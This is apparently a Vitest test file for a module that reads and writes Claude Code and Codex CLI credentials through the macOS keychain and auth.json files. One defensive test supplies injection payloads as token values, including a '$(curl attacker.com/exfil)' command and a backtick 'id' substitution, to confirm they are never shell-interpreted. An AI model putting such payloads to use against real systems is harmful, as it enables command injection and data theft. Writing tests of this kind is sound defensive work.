import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";

const execSyncMock = vi.fn();
const execFileSyncMock = vi.fn();
const CLI_CREDENTIALS_CACHE_TTL_MS = 15 * 60 * 1000;
let readClaudeCliCredentialsCached: typeof import("./cli-credentials.js").readClaudeCliCredentialsCached;
let readCodexCliCredentialsCached: typeof import("./cli-credentials.js").readCodexCliCredentialsCached;
let resetCliCredentialCachesForTest: typeof import("./cli-credentials.js").resetCliCredentialCachesForTest;
let writeClaudeCliKeychainCredentials: typeof import("./cli-credentials.js").writeClaudeCliKeychainCredentials;
let writeClaudeCliCredentials: typeof import("./cli-credentials.js").writeClaudeCliCredentials;
let readCodexCliCredentials: typeof import("./cli-credentials.js").readCodexCliCredentials;
let writeCodexCliCredentials: typeof import("./cli-credentials.js").writeCodexCliCredentials;
let writeCodexCliFileCredentials: typeof import("./cli-credentials.js").writeCodexCliFileCredentials;

function mockExistingClaudeKeychainItem() {
  execFileSyncMock.mockImplementation((file: unknown, args: unknown) => {
    const argv = Array.isArray(args) ? args.map(String) : [];
    if (String(file) === "security" && argv.includes("find-generic-password")) {
      return JSON.stringify({
        claudeAiOauth: {
          accessToken: "old-access",
          expiresAt: Date.now() + 60_000,
          refreshToken: "old-refresh",
        },
      });
    }
    return "";
  });
}

function getAddGenericPasswordCall() {
  return execFileSyncMock.mock.calls.find(
    ([binary, args]) =>
      String(binary) === "security" &&
      Array.isArray(args) &&
      (args as unknown[]).map(String).includes("add-generic-password"),
  );
}

async function readCachedClaudeCliCredentials(allowKeychainPrompt: boolean) {
  return readClaudeCliCredentialsCached({
    allowKeychainPrompt,
    execSync: execSyncMock,
    platform: "darwin",
    ttlMs: CLI_CREDENTIALS_CACHE_TTL_MS,
  });
}

function createJwtWithExp(expSeconds: number): string {
  const encode = (value: Record<string, unknown>) =>
    Buffer.from(JSON.stringify(value)).toString("base64url");
  return `${encode({ alg: "RS256", typ: "JWT" })}.${encode({ exp: expSeconds })}.signature`;
}

function mockClaudeCliCredentialRead() {
  execSyncMock.mockImplementation(() =>
    JSON.stringify({
      claudeAiOauth: {
        accessToken: `token-${Date.now()}`,
        expiresAt: Date.now() + 60_000,
        refreshToken: "cached-refresh",
      },
    }),
  );
}

describe("cli credentials", () => {
  beforeAll(async () => {
    ({
      readClaudeCliCredentialsCached,
      readCodexCliCredentialsCached,
      resetCliCredentialCachesForTest,
      writeClaudeCliKeychainCredentials,
      writeClaudeCliCredentials,
      readCodexCliCredentials,
      writeCodexCliCredentials,
      writeCodexCliFileCredentials,
    } = await import("./cli-credentials.js"));
  });

  beforeEach(() => {
    vi.useFakeTimers();
  });

  afterEach(() => {
    vi.useRealTimers();
    execSyncMock.mockClear().mockImplementation(() => undefined);
    execFileSyncMock.mockClear().mockImplementation(() => undefined);
    delete process.env.CODEX_HOME;
    resetCliCredentialCachesForTest();
  });

  it("updates the Claude Code keychain item in place", async () => {
    mockExistingClaudeKeychainItem();

    const ok = writeClaudeCliKeychainCredentials(
      {
        access: "new-access",
        expires: Date.now() + 60_000,
        refresh: "new-refresh",
      },
      { execFileSync: execFileSyncMock },
    );

    expect(ok).toBe(true);

    // Verify execFileSync was called with array args (no shell interpretation)
    expect(execFileSyncMock).toHaveBeenCalledTimes(2);
    const addCall = getAddGenericPasswordCall();
    expect(addCall?.[0]).toBe("security");
    expect((addCall?.[1] as string[] | undefined) ?? []).toContain("-U");
  });

  it.each([
    {
      access: "x'$(curl attacker.com/exfil)'y",
      expectedPayload: "x'$(curl attacker.com/exfil)'y",
      refresh: "safe-refresh",
    },
    {
      access: "safe-access",
      expectedPayload: "token`id`value",
      refresh: "token`id`value",
    },
  ] as const)(
    "prevents shell injection via untrusted token payload value $expectedPayload",
    async ({ access, refresh, expectedPayload }) => {
      execFileSyncMock.mockClear();
      mockExistingClaudeKeychainItem();

      const ok = writeClaudeCliKeychainCredentials(
        {
          access,
          expires: Date.now() + 60_000,
          refresh,
        },
        { execFileSync: execFileSyncMock },
      );

      expect(ok).toBe(true);

      // Token payloads must remain literal in argv, never shell-interpreted.
      const addCall = getAddGenericPasswordCall();
      const args = (addCall?.[1] as string[] | undefined) ?? [];
      const wIndex = args.indexOf("-w");
      const passwordValue = args[wIndex + 1];
      expect(passwordValue).toContain(expectedPayload);
      expect(addCall?.[0]).toBe("security");
    },
  );

  it("falls back to the file store when the keychain update fails", async () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "openclaw-"));
    const credPath = path.join(tempDir, ".claude", ".credentials.json");

    fs.mkdirSync(path.dirname(credPath), { mode: 0o700, recursive: true });
    fs.writeFileSync(
      credPath,
      `${JSON.stringify(
        {
          claudeAiOauth: {
            accessToken: "old-access",
            expiresAt: Date.now() + 60_000,
            refreshToken: "old-refresh",
          },
        },
        null,
        2,
      )}\n`,
      "utf8",
    );

    const writeKeychain = vi.fn(() => false);

    const ok = writeClaudeCliCredentials(
      {
        access: "new-access",
        expires: Date.now() + 120_000,
        refresh: "new-refresh",
      },
      {
        homeDir: tempDir,
        platform: "darwin",
        writeKeychain,
      },
    );

    expect(ok).toBe(true);
    expect(writeKeychain).toHaveBeenCalledTimes(1);

    const updated = JSON.parse(fs.readFileSync(credPath, "utf8")) as {
      claudeAiOauth?: {
        accessToken?: string;
        refreshToken?: string;
        expiresAt?: number;
      };
    };

    expect(updated.claudeAiOauth?.accessToken).toBe("new-access");
    expect(updated.claudeAiOauth?.refreshToken).toBe("new-refresh");
    expect(updated.claudeAiOauth?.expiresAt).toBeTypeOf("number");
  });

  it.each([
    {
      advanceMs: 0,
      allowKeychainPromptSecondRead: false,
      expectSameObject: true,
      expectedCalls: 1,
      name: "caches Claude Code CLI credentials within the TTL window",
    },
    {
      advanceMs: CLI_CREDENTIALS_CACHE_TTL_MS + 1,
      allowKeychainPromptSecondRead: true,
      expectSameObject: false,
      expectedCalls: 2,
      name: "refreshes Claude Code CLI credentials after the TTL window",
    },
  ] as const)(
    "$name",
    async ({ allowKeychainPromptSecondRead, advanceMs, expectedCalls, expectSameObject }) => {
      mockClaudeCliCredentialRead();
      vi.setSystemTime(new Date("2025-01-01T00:00:00Z"));

      const first = await readCachedClaudeCliCredentials(true);
      if (advanceMs > 0) {
        vi.advanceTimersByTime(advanceMs);
      }
      const second = await readCachedClaudeCliCredentials(allowKeychainPromptSecondRead);

      expect(first).toBeTruthy();
      expect(second).toBeTruthy();
      if (expectSameObject) {
        expect(second).toEqual(first);
      } else {
        expect(second).not.toEqual(first);
      }
      expect(execSyncMock).toHaveBeenCalledTimes(expectedCalls);
    },
  );

  it("reads Codex credentials from keychain when available", async () => {
    const tempHome = fs.mkdtempSync(path.join(os.tmpdir(), "openclaw-codex-"));
    process.env.CODEX_HOME = tempHome;
    const expSeconds = Math.floor(Date.parse("2026-03-23T00:48:49Z") / 1000);

    const accountHash = "cli|";

    execSyncMock.mockImplementation((command: unknown) => {
      const cmd = String(command);
      expect(cmd).toContain("Codex Auth");
      expect(cmd).toContain(accountHash);
      return JSON.stringify({
        last_refresh: "2026-01-01T00:00:00Z",
        tokens: {
          access_token: createJwtWithExp(expSeconds),
          refresh_token: "keychain-refresh",
        },
      });
    });

    const creds = readCodexCliCredentials({ execSync: execSyncMock, platform: "darwin" });

    expect(creds).toMatchObject({
      access: createJwtWithExp(expSeconds),
      expires: expSeconds * 1000,
      provider: "openai-codex",
      refresh: "keychain-refresh",
    });
  });

  it("falls back to Codex auth.json when keychain is unavailable", async () => {
    const tempHome = fs.mkdtempSync(path.join(os.tmpdir(), "openclaw-codex-"));
    process.env.CODEX_HOME = tempHome;
    const expSeconds = Math.floor(Date.parse("2026-03-24T12:34:56Z") / 1000);
    execSyncMock.mockImplementation(() => {
      throw new Error("not found");
    });

    const authPath = path.join(tempHome, "auth.json");
    fs.mkdirSync(tempHome, { mode: 0o700, recursive: true });
    fs.writeFileSync(
      authPath,
      JSON.stringify({
        tokens: {
          access_token: createJwtWithExp(expSeconds),
          refresh_token: "file-refresh",
        },
      }),
      "utf8",
    );

    const creds = readCodexCliCredentials({ execSync: execSyncMock });

    expect(creds).toMatchObject({
      access: createJwtWithExp(expSeconds),
      expires: expSeconds * 1000,
      provider: "openai-codex",
      refresh: "file-refresh",
    });
  });

  it("invalidates cached Codex credentials when auth.json changes within the TTL window", () => {
    const tempHome = fs.mkdtempSync(path.join(os.tmpdir(), "openclaw-codex-cache-"));
    process.env.CODEX_HOME = tempHome;
    const authPath = path.join(tempHome, "auth.json");
    const firstExpiry = Math.floor(Date.parse("2026-03-24T12:34:56Z") / 1000);
    const secondExpiry = Math.floor(Date.parse("2026-03-25T12:34:56Z") / 1000);
    try {
      fs.mkdirSync(tempHome, { mode: 0o700, recursive: true });
      fs.writeFileSync(
        authPath,
        JSON.stringify({
          tokens: {
            access_token: createJwtWithExp(firstExpiry),
            refresh_token: "stale-refresh",
          },
        }),
        "utf8",
      );
      fs.utimesSync(authPath, new Date("2026-03-24T10:00:00Z"), new Date("2026-03-24T10:00:00Z"));
      vi.setSystemTime(new Date("2026-03-24T10:00:00Z"));

      const first = readCodexCliCredentialsCached({
        execSync: execSyncMock,
        platform: "linux",
        ttlMs: CLI_CREDENTIALS_CACHE_TTL_MS,
      });

      expect(first).toMatchObject({
        expires: firstExpiry * 1000,
        refresh: "stale-refresh",
      });

      fs.writeFileSync(
        authPath,
        JSON.stringify({
          tokens: {
            access_token: createJwtWithExp(secondExpiry),
            refresh_token: "fresh-refresh",
          },
        }),
        "utf8",
      );
      fs.utimesSync(authPath, new Date("2026-03-24T10:05:00Z"), new Date("2026-03-24T10:05:00Z"));
      vi.advanceTimersByTime(60_000);

      const second = readCodexCliCredentialsCached({
        execSync: execSyncMock,
        platform: "linux",
        ttlMs: CLI_CREDENTIALS_CACHE_TTL_MS,
      });

      expect(second).toMatchObject({
        expires: secondExpiry * 1000,
        refresh: "fresh-refresh",
      });
    } finally {
      fs.rmSync(tempHome, { force: true, recursive: true });
    }
  });

  it("updates existing Codex auth.json in place", () => {
    const tempHome = fs.mkdtempSync(path.join(os.tmpdir(), "openclaw-codex-write-"));
    process.env.CODEX_HOME = tempHome;
    try {
      fs.mkdirSync(tempHome, { mode: 0o700, recursive: true });
      const authPath = path.join(tempHome, "auth.json");
      fs.writeFileSync(
        authPath,
        JSON.stringify(
          {
            OPENAI_API_KEY: "sk-existing",
            auth_mode: "chatgpt",
            last_refresh: "2026-03-01T00:00:00.000Z",
            tokens: {
              access_token: "old-access",
              account_id: "acct-old",
              id_token: "id-token",
              refresh_token: "old-refresh",
            },
          },
          null,
          2,
        ),
        "utf8",
      );

      const ok = writeCodexCliFileCredentials({
        access: "new-access",
        accountId: "acct-new",
        expires: Date.now() + 60_000,
        refresh: "new-refresh",
      });

      expect(ok).toBe(true);
      const persisted = JSON.parse(fs.readFileSync(authPath, "utf8")) as Record<string, unknown>;
      expect(persisted).toMatchObject({
        OPENAI_API_KEY: "sk-existing",
        auth_mode: "chatgpt",
      });
      expect(persisted.tokens).toMatchObject({
        access_token: "new-access",
        account_id: "acct-new",
        id_token: "id-token",
        refresh_token: "new-refresh",
      });
      expect(typeof persisted.last_refresh).toBe("string");
    } finally {
      fs.rmSync(tempHome, { force: true, recursive: true });
    }
  });

  it("prefers the existing Codex keychain entry over auth.json on darwin writes", () => {
    const tempHome = fs.mkdtempSync(path.join(os.tmpdir(), "openclaw-codex-keychain-write-"));
    process.env.CODEX_HOME = tempHome;
    try {
      const expSeconds = Math.floor(Date.parse("2026-03-26T12:34:56Z") / 1000);
      execSyncMock.mockImplementation((command: unknown) => {
        const cmd = String(command);
        expect(cmd).toContain("Codex Auth");
        return JSON.stringify({
          auth_mode: "chatgpt",
          last_refresh: "2026-03-01T00:00:00.000Z",
          tokens: {
            access_token: createJwtWithExp(expSeconds),
            account_id: "acct-old",
            id_token: "id-token",
            refresh_token: "old-refresh",
          },
        });
      });

      const ok = writeCodexCliCredentials(
        {
          access: "new-access",
          accountId: "acct-new",
          expires: Date.now() + 60_000,
          refresh: "new-refresh",
        },
        {
          execFileSync: execFileSyncMock,
          execSync: execSyncMock,
          platform: "darwin",
        },
      );

      expect(ok).toBe(true);
      expect(execFileSyncMock).toHaveBeenCalledTimes(1);
      const addCall = getAddGenericPasswordCall();
      expect(addCall?.[0]).toBe("security");
      const payload = (() => {
        const args = (addCall?.[1] as string[] | undefined) ?? [];
        const valueIndex = args.indexOf("-w");
        return valueIndex !== -1 ? args[valueIndex + 1] : undefined;
      })();
      expect(payload).toBeDefined();
      const parsed = JSON.parse(String(payload)) as Record<string, unknown>;
      expect(parsed.tokens).toMatchObject({
        access_token: "new-access",
        account_id: "acct-new",
        id_token: "id-token",
        refresh_token: "new-refresh",
      });
      expect(parsed.auth_mode).toBe("chatgpt");
    } finally {
      fs.rmSync(tempHome, { force: true, recursive: true });
    }
  });
});
